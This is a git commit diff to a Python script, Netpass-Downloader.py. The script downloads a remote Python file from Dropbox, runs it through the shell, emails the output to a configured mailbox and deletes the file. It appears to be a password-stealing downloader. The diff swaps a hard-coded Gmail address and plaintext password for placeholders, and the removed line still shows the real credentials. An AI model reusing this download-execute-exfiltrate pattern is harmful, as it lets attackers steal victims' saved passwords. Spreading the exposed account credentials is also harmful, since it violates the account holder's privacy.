da07930a28016d688724b01f07730f8231631003
Yousef Adel <51286063+Anonymous2003@users.noreply.github.com>
2021-10-03 05:54:20 +0300

    Update Netpass-Downloader.py

--- Netpass/Netpass-Downloader.py
+++ Netpass/Netpass-Downloader.py
@@ -14,5 +14,5 @@ def sending_mail(email, password , message) :
 
 Downloader("https://dl.dropboxusercontent.com/s/b32iy3m6b6glspw/NetPass.py?dl=1" , "kk.py")
 Command_result = subprocess.check_output("python kk.py" , shell=True)
-sending_mail("abama.test.2020@gmail.com", "Yousef@2003", Command_result)
+sending_mail("Email", "Password", Command_result)
 subprocess.check_output("del kk.py" , shell=True)
